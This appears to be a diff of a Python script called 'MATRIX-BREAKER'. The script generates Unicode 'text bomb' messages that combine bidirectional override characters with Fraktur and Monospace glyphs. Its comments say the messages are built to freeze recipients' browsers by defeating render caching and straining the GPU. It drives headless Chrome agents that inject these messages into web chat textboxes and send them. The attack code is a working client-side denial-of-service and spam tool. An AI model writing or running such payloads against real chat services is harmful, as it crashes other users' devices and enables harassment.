@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # 🚀 PROJECT: PRAVEER.OWNS (MATRIX-BREAKER V26)
-# 📅 STATUS: MAIN-THREAD-FREEZE | 4-AGENT TOTAL | CSS-ENGINE-ATTACK
+# 📅 STATUS: MAIN-THREAD-FREEZE | 4-AGENT TOTAL | CSS-SHAPER-ATTACK
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -33,12 +33,12 @@ def get_matrix_breaker_payload():
     header = f"👑 PRAVEER OWNS THE MATRIX 👑 [KERNEL_THREAT:{u_id}]"
     
     body = []
-    # We use 'Mathematical Fraktur' and 'Monospace' blocks. 
+    # Using 'Mathematical Fraktur' and 'Monospace' blocks. 
     # Switching between these character sets forces the browser to 
     # re-map the Font-Feature table 300+ times per message.
     for i in range(290):
-        # Nested directional isolates combined with font-family shifts
         bidi = "\u202E" if i % 2 == 0 else "\u202D"
+        # The mix of Fraktur and Monospace prevents the browser from using its render-cache.
         line = f"{iso}{bidi} 𝕻 𝚁 𝕬 𝚅 𝕰 𝙴 𝚁 {i} 𝕻 𝕬 𝕻 𝕬 {pop}{glue}"
         body.append(line)
         
@@ -55,7 +55,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # We target the GPU's memory management
+        # Direct GPU pressure
         chrome_options.add_argument("--enable-gpu-rasterization")
         chrome_options.add_argument("--js-flags='--max-old-space-size=4096'")
         
@@ -72,7 +72,6 @@ def get_driver(agent_id):
 def adaptive_send(driver, text):
     try:
         box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-        # Direct JS injection to avoid browser-side input lag
         driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
         time.sleep(0.3)
         box.send_keys(Keys.ENTER)
